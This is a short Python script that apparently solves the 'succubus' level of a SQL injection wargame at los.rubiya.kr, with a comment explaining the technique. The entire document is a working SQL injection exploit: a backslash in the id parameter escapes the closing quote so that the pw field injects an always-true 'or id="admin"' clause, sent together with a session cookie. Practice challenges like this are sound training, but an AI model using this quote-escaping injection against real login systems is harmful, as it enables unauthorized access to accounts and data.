import requests
headers= {'Cookie':'PHPSESSID=qet57jlmrh1sabcamosgidu7v9'}
url = "https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php?id=\&pw=%20or%20id=%22admin%22%20%23"
r = requests.get(url, headers=headers).text
if "<h2>SUCCUBUS Clear!</h2>" in r:
    print(r)

# by escaping the closing ' of the id clause, we can get out of the sql statement without closing the ' ourselves since
# it is blocked, rather we let the statement do it for us
# select id from prob_succubus where id='\' and pw=' or id="admin" #'